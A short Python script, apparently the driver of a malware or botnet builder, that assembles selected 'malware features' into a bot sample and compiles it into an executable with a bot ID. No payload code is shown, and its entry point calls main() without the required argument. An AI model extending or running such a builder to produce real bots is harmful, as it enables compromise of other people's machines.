import MalwareFeatures
import CodeManager

# main function
# returns a string containing the path to the exe, -1 on failure
def main(features):
    codeManager = CodeManager.CodeManager()
    # add basic things to the bot, standard includes, an id ...
    codeManager.start_basic_bot_sample()
    malwareFeatures = []
    for feat in features:
        featObj = codeManager.create_feature_object(feat)
        malwareFeatures.append(featObj)

    # feature = MalwareFeatures.HelloFeature()

    # this could probably just happen within the for loop above
    for feature in malwareFeatures:
        codeManager.add_malware_feature(feature)

    # builtSample = 'newSample.exe'
    sourceCodeFile = 'newSample.cpp'

    res, botID = codeManager.build_executable(sourceCodeFile)
    return res, botID

if __name__ == "__main__":
    main()
